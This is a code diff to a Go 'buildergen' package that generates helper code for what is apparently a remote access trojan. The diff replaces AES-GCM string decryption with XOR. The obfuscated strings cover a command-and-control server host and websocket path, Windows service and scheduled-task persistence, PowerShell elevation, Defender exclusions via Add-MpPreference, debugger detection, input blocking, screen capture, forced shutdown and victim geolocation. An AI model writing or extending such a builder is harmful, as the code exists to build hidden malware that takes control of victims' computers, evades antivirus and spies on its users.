@@ -1,512 +1,461 @@
 package buildergen
 
-import (
-	"crypto/aes"
-	"crypto/cipher"
-	"encoding/base64"
-	"strings"
-)
+import "strings"
 
 func templateHelpers() string {
 	return strings.TrimSpace(`
-func aesDecrypt(encrypted string, key []byte) string {
-	if encrypted == "" || len(key) == 0 {
-		return ""
+func xor(input []byte, key []byte) []byte {
+	if len(key) == 0 {
+		return append([]byte(nil), input...)
 	}
-	data, err := base64.StdEncoding.DecodeString(encrypted)
-	if err != nil {
-		return ""
+	out := make([]byte, len(input))
+	for i := 0; i < len(input); i++ {
+		out[i] = input[i] ^ key[i%len(key)]
 	}
-	aesKey := make([]byte, 32)
-	copy(aesKey, key)
-	block, err := aes.NewCipher(aesKey)
-	if err != nil {
-		return ""
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return ""
-	}
-	nonceSize := gcm.NonceSize()
-	if len(data) < nonceSize {
-		return ""
-	}
-	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
-	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		return ""
-	}
-	return string(plaintext)
-}
-
-func decryptString(enc []byte) string {
-	return aesDecrypt(string(enc), decryptionKey)
+	return out
 }
 
 func getServerHost() string {
-	return decryptString(encServerHost)
+	return string(xor(encServerHost, decryptionKey))
 }
 
 func getServiceName() string {
-	return decryptString(encServiceName)
+	return string(xor(encServiceName, decryptionKey))
 }
 
 func getDisplayName() string {
-	return decryptString(encDisplayName)
+	return string(xor(encDisplayName, decryptionKey))
 }
 
 func getServiceExeName() string {
-	return decryptString(encServiceExeName)
+	return string(xor(encServiceExeName, decryptionKey))
 }
 
 func getWorkerExeName() string {
-	return decryptString(encWorkerExeName)
+	return string(xor(encWorkerExeName, decryptionKey))
 }
 
 func getMutexName() string {
-	return decryptString(encMutexName)
+	return string(xor(encMutexName, decryptionKey))
 }
 
 func getSchtasksExeName() string {
-	return decryptString(encSchtasksExe)
+	return string(xor(encSchtasksExe, decryptionKey))
 }
 
 func getProgramDataEnvName() string {
-	return decryptString(encProgramDataEnv)
+	return string(xor(encProgramDataEnv, decryptionKey))
 }
 
 func getAppDataEnvName() string {
-	return decryptString(encAppDataEnv)
+	return string(xor(encAppDataEnv, decryptionKey))
 }
 
 func getMicrosoftDirName() string {
-	return decryptString(encMicrosoftDir)
+	return string(xor(encMicrosoftDir, decryptionKey))
 }
 
 func getWindowsDirName() string {
-	return decryptString(encWindowsDir)
+	return string(xor(encWindowsDir, decryptionKey))
 }
 
 func getWindowsUpdateDirName() string {
-	return decryptString(encWindowsUpdateDir)
+	return string(xor(encWindowsUpdateDir, decryptionKey))
 }
 
 func getAdvapi32DLL() string {
-	return decryptString(encAdvapi32Dll)
+	return string(xor(encAdvapi32Dll, decryptionKey))
 }
 
 func getKernel32DLL() string {
-	return decryptString(encKernel32Dll)
+	return string(xor(encKernel32Dll, decryptionKey))
 }
 
 func getOpenSCManagerWName() string {
-	return decryptString(encOpenSCManagerWName)
+	return string(xor(encOpenSCManagerWName, decryptionKey))
 }
 
 func getCreateServiceWName() string {
-	return decryptString(encCreateServiceWName)
+	return string(xor(encCreateServiceWName, decryptionKey))
 }
 
 func getCloseServiceHandleName() string {
-	return decryptString(encCloseServiceHandleName)
+	return string(xor(encCloseServiceHandleName, decryptionKey))
 }
 
 func getOpenServiceWName() string {
-	return decryptString(encOpenServiceWName)
+	return string(xor(encOpenServiceWName, decryptionKey))
 }
 
 func getStartServiceWName() string {
-	return decryptString(encStartServiceWName)
+	return string(xor(encStartServiceWName, decryptionKey))
 }
 
 func getOpenProcessTokenName() string {
-	return decryptString(encOpenProcessTokenName)
+	return string(xor(encOpenProcessTokenName, decryptionKey))
 }
 
 func getGetTokenInformationName() string {
-	return decryptString(encGetTokenInformationName)
+	return string(xor(encGetTokenInformationName, decryptionKey))
 }
 
 func getCloseHandleName() string {
-	return decryptString(encCloseHandleName)
+	return string(xor(encCloseHandleName, decryptionKey))
 }
 
 func getPowerShellExeName() string {
-	return decryptString(encPowerShellExe)
+	return string(xor(encPowerShellExe, decryptionKey))
 }
 
 func getPsStartProcessPrefix() string {
-	return decryptString(encPsStartProcessPrefix)
+	return string(xor(encPsStartProcessPrefix, decryptionKey))
 }
 
 func getPsRunasSuffix() string {
-	return decryptString(encPsRunasSuffix)
+	return string(xor(encPsRunasSuffix, decryptionKey))
 }
 
 func getAddMpPreferenceCmd() string {
-	return decryptString(encAddMpPref)
+	return string(xor(encAddMpPref, decryptionKey))
 }
 
 func getIsDebuggerPresentName() string {
-	return decryptString(encIsDebuggerPresent)
+	return string(xor(encIsDebuggerPresent, decryptionKey))
 }
 
 func getWsScheme() string {
-	return decryptString(encWsScheme)
+	return string(xor(encWsScheme, decryptionKey))
 }
 
 func getWsPath() string {
-	return decryptString(encWsPath)
+	return string(xor(encWsPath, decryptionKey))
 }
 
 func getBuilderTokenHeader() string {
-	return decryptString(encBuilderTokenHeader)
+	return string(xor(encBuilderTokenHeader, decryptionKey))
 }
 
 func getOwnerName() string {
-	return decryptString(encOwnerName)
+	return string(xor(encOwnerName, decryptionKey))
 }
 
 func getBuildID() string {
-	return decryptString(encBuildID)
+	return string(xor(encBuildID, decryptionKey))
 }
 
 func getCmdPrefix() string {
-	return decryptString(encCmdPrefix)
+	return string(xor(encCmdPrefix, decryptionKey))
 }
 
 func getBgPrefix() string {
-	return decryptString(encBgPrefix)
+	return string(xor(encBgPrefix, decryptionKey))
 }
 
 func getCmdExeName() string {
-	return decryptString(encCmdExe)
+	return string(xor(encCmdExe, decryptionKey))
 }
 
 func getCmdCArg() string {
-	return decryptString(encCmdCArg)
+	return string(xor(encCmdCArg, decryptionKey))
 }
 
 func getMsgBoxPrefix() string {
-	return decryptString(encMsgBoxPrefix)
+	return string(xor(encMsgBoxPrefix, decryptionKey))
 }
 
 func getSwapMouseLeftCmd() string {
-	return decryptString(encSwapMouseLeft)
+	return string(xor(encSwapMouseLeft, decryptionKey))
 }
 
 func getSwapMouseRightCmd() string {
-	return decryptString(encSwapMouseRight)
+	return string(xor(encSwapMouseRight, decryptionKey))
 }
 
 func getShutdownExeName() string {
-	return decryptString(encShutdownExe)
+	return string(xor(encShutdownExe, decryptionKey))
 }
 
 func getShutdownRestartArg() string {
-	return decryptString(encShutdownRestart)
+	return string(xor(encShutdownRestart, decryptionKey))
 }
 
 func getShutdownPoweroffArg() string {
-	return decryptString(encShutdownPoweroff)
+	return string(xor(encShutdownPoweroff, decryptionKey))
 }
 
 func getShutdownTimeoutArg() string {
-	return decryptString(encShutdownTimeout)
+	return string(xor(encShutdownTimeout, decryptionKey))
 }
 
 func getShutdownZeroArg() string {
-	return decryptString(encShutdownZero)
+	return string(xor(encShutdownZero, decryptionKey))
 }
 
 func getShakeOnCmd() string {
-	return decryptString(encShakeOn)
+	return string(xor(encShakeOn, decryptionKey))
 }
 
 func getShakeOffCmd() string {
-	return decryptString(encShakeOff)
+	return string(xor(encShakeOff, decryptionKey))
 }
 
 func getUser32DLL() string {
-	return decryptString(encUser32Dll)
+	return string(xor(encUser32Dll, decryptionKey))
 }
 
 func getGetForegroundWindowName() string {
-	return decryptString(encGetForegroundWindowName)
+	return string(xor(encGetForegroundWindowName, decryptionKey))
 }
 
 func getGetWindowTextWName() string {
-	return decryptString(encGetWindowTextWName)
+	return string(xor(encGetWindowTextWName, decryptionKey))
 }
 
 func getGetWindowTextLengthWName() string {
-	return decryptString(encGetWindowTextLengthWName)
+	return string(xor(encGetWindowTextLengthWName, decryptionKey))
 }
 
 func getUnknownWindowLabel() string {
-	return decryptString(encUnknownWindow)
+	return string(xor(encUnknownWindow, decryptionKey))
 }
 
 func getNoActiveWindowLabel() string {
-	return decryptString(encNoActiveWindow)
+	return string(xor(encNoActiveWindow, decryptionKey))
 }
 
 func getUntitledWindowLabel() string {
-	return decryptString(encUntitledWindow)
+	return string(xor(encUntitledWindow, decryptionKey))
 }
 
 func getSystemParametersInfoWName() string {
-	return decryptString(encSystemParametersInfoWName)
+	return string(xor(encSystemParametersInfoWName, decryptionKey))
 }
 
 func getBlockInputName() string {
-	return decryptString(encBlockInputName)
+	return string(xor(encBlockInputName, decryptionKey))
 }
 
 func getMessageBoxWName() string {
-	return decryptString(encMessageBoxWName)
+	return string(xor(encMessageBoxWName, decryptionKey))
 }
 
 func getSetCursorPosName() string {
-	return decryptString(encSetCursorPosName)
+	return string(xor(encSetCursorPosName, decryptionKey))
 }
 
 func getBlockInputOnCmd() string {
-	return decryptString(encBlockInputOnCmd)
+	return string(xor(encBlockInputOnCmd, decryptionKey))
 }
 
 func getBlockInputOffCmd() string {
-	return decryptString(encBlockInputOffCmd)
+	return string(xor(encBlockInputOffCmd, decryptionKey))
 }
 
 func getConsoleWindowName() string {
-	return decryptString(encGetConsoleWindowName)
+	return string(xor(encGetConsoleWindowName, decryptionKey))
 }
 
 func getShowWindowName() string {
-	return decryptString(encShowWindowName)
+	return string(xor(encShowWindowName, decryptionKey))
 }
 
 func getGdi32DLL() string {
-	return decryptString(encGdi32Dll)
+	return string(xor(encGdi32Dll, decryptionKey))
 }
 
 func getGetDesktopWindowName() string {
-	return decryptString(encGetDesktopWindowName)
+	return string(xor(encGetDesktopWindowName, decryptionKey))
 }
 
 func getGetDCName() string {
-	return decryptString(encGetDCName)
+	return string(xor(encGetDCName, decryptionKey))
 }
 
 func getCreateCompatibleDCName() string {
-	return decryptString(encCreateCompatibleDCName)
+	return string(xor(encCreateCompatibleDCName, decryptionKey))
 }
 
 func getCreateCompatibleBitmapName() string {
-	return decryptString(encCreateCompatibleBitmapName)
+	return string(xor(encCreateCompatibleBitmapName, decryptionKey))
 }
 
 func getSelectObjectName() string {
-	return decryptString(encSelectObjectName)
+	return string(xor(encSelectObjectName, decryptionKey))
 }
 
 func getBitBltName() string {
-	return decryptString(encBitBltName)
+	return string(xor(encBitBltName, decryptionKey))
 }
 
 func getGetDeviceCapsName() string {
-	return decryptString(encGetDeviceCapsName)
+	return string(xor(encGetDeviceCapsName, decryptionKey))
 }
 
 func getDeleteDCName() string {
-	return decryptString(encDeleteDCName)
+	return string(xor(encDeleteDCName, decryptionKey))
 }
 
 func getReleaseDCName() string {
-	return decryptString(encReleaseDCName)
+	return string(xor(encReleaseDCName, decryptionKey))
 }
 
 func getDeleteObjectName() string {
-	return decryptString(encDeleteObjectName)
+	return string(xor(encDeleteObjectName, decryptionKey))
 }
 
 func getGetDIBitsName() string {
-	return decryptString(encGetDIBitsName)
+	return string(xor(encGetDIBitsName, decryptionKey))
 }
 
 func getHttpPrefix() string {
-	return decryptString(encHttpPrefix)
+	return string(xor(encHttpPrefix, decryptionKey))
 }
 
 func getHttpsPrefix() string {
-	return decryptString(encHttpsPrefix)
+	return string(xor(encHttpsPrefix, decryptionKey))
 }
 
 func getHttpsScheme() string {
-	return decryptString(encHttpsScheme)
+	return string(xor(encHttpsScheme, decryptionKey))
 }
 
 func getSchemeSeparator() string {
-	return decryptString(encSchemeSep)
+	return string(xor(encSchemeSep, decryptionKey))
 }
 
 func getBgImageName() string {
-	return decryptString(encBgImageName)
+	return string(xor(encBgImageName, decryptionKey))
 }
 
 func getRemotePrefix() string {
-	return decryptString(encRemotePrefix)
+	return string(xor(encRemotePrefix, decryptionKey))
 }
 
 func getExeSuffix() string {
-	return decryptString(encExeSuffix)
+	return string(xor(encExeSuffix, decryptionKey))
 }
 
 func getCmdStart() string {
-	return decryptString(encCmdStart)
+	return string(xor(encCmdStart, decryptionKey))
 }
 
 func getIpifyURL() string {
-	return decryptString(encIpifyURL)
+	return string(xor(encIpifyURL, decryptionKey))
 }
 
 func getIpApiHost() string {
-	return decryptString(encIpApiHost)
+	return string(xor(encIpApiHost, decryptionKey))
 }
 
 func getIpApiPath() string {
-	return decryptString(encIpApiPath)
+	return string(xor(encIpApiPath, decryptionKey))
 }
 
 func getIpApiQuery() string {
-	return decryptString(encIpApiQuery)
+	return string(xor(encIpApiQuery, decryptionKey))
 }
 
 func getCountryFallback() string {
-	return decryptString(encCountryFallback)
-}
-
-func getPsGetCpu() string {
-	return decryptString(encPsGetCpu)
+	return string(xor(encCountryFallback, decryptionKey))
 }
 
 func getWmic() string {
-	return decryptString(encWmic)
+	return string(xor(encWmic, decryptionKey))
+}
+
+func getPsGetCpu() string {
+	return string(xor(encPsGetCpu, decryptionKey))
 }
 
 func getWmicGetCpu() string {
-	return decryptString(encWmicGetCpu)
+	return string(xor(encWmicGetCpu, decryptionKey))
 }
 
 func getPsGetGpu() string {
-	return decryptString(encPsGetGpu)
+	return string(xor(encPsGetGpu, decryptionKey))
 }
 
 func getWmicGetGpu() string {
-	return decryptString(encWmicGetGpu)
+	return string(xor(encWmicGetGpu, decryptionKey))
 }
 
 func getPsGetRam() string {
-	return decryptString(encPsGetRam)
+	return string(xor(encPsGetRam, decryptionKey))
 }
 
 func getWmicGetRam() string {
-	return decryptString(encWmicGetRam)
+	return string(xor(encWmicGetRam, decryptionKey))
 }
 
 func getPsGetOs() string {
-	return decryptString(encPsGetOs)
+	return string(xor(encPsGetOs, decryptionKey))
 }
 
 func getWmicGetOs() string {
-	return decryptString(encWmicGetOs)
+	return string(xor(encWmicGetOs, decryptionKey))
 }
 
 func getSystemPowerStatusName() string {
-	return decryptString(encGetSystemPowerStatusName)
+	return string(xor(encGetSystemPowerStatusName, decryptionKey))
 }
 
 func getLinuxCpuCmd() string {
-	return decryptString(encLinuxCpuCmd)
+	return string(xor(encLinuxCpuCmd, decryptionKey))
 }
 
 func getDarwinCpuCmd() string {
-	return decryptString(encDarwinCpuCmd)
+	return string(xor(encDarwinCpuCmd, decryptionKey))
 }
 
 func getUnknownCPU() string {
-	return decryptString(encUnknownCPU)
+	return string(xor(encUnknownCPU, decryptionKey))
 }
 
 func getUnknownGPU() string {
-	return decryptString(encUnknownGPU)
+	return string(xor(encUnknownGPU, decryptionKey))
 }
 
 func getUnknownRAM() string {
-	return decryptString(encUnknownRAM)
+	return string(xor(encUnknownRAM, decryptionKey))
 }
 
 func getUnknownOS() string {
-	return decryptString(encUnknownOS)
+	return string(xor(encUnknownOS, decryptionKey))
 }
 
 func getLaptopLabel() string {
-	return decryptString(encLaptopLabel)
+	return string(xor(encLaptopLabel, decryptionKey))
 }
 
 func getDesktopLabel() string {
-	return decryptString(encDesktopLabel)
+	return string(xor(encDesktopLabel, decryptionKey))
 }
 
 func getShCmd() string {
-	return decryptString(encShCmd)
+	return string(xor(encShCmd, decryptionKey))
 }
 
 func getDashCArg() string {
-	return decryptString(encDashCArg)
+	return string(xor(encDashCArg, decryptionKey))
 }
 
 func getSysctlCmd() string {
-	return decryptString(encSysctlCmd)
+	return string(xor(encSysctlCmd, decryptionKey))
 }
 
 func getSysctlNameArg() string {
-	return decryptString(encSysctlNameArg)
+	return string(xor(encSysctlNameArg, decryptionKey))
 }
 
 func getXdgOpen() string {
-	return decryptString(encXdgOpen)
+	return string(xor(encXdgOpen, decryptionKey))
 }
 
 func getBuilderToken() []byte {
 	if len(encBuilderToken) == 0 {
 		return nil
 	}
-	data, err := base64.StdEncoding.DecodeString(string(encBuilderToken))
-	if err != nil {
-		return nil
-	}
-	aesKey := make([]byte, 32)
-	copy(aesKey, decryptionKey)
-	block, err := aes.NewCipher(aesKey)
-	if err != nil {
-		return nil
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		return nil
-	}
-	nonceSize := gcm.NonceSize()
-	if len(data) < nonceSize {
-		return nil
-	}
-	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
-	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		return nil
-	}
-	return plaintext
+	return xor(encBuilderToken, decryptionKey)
 }
 `)
 }
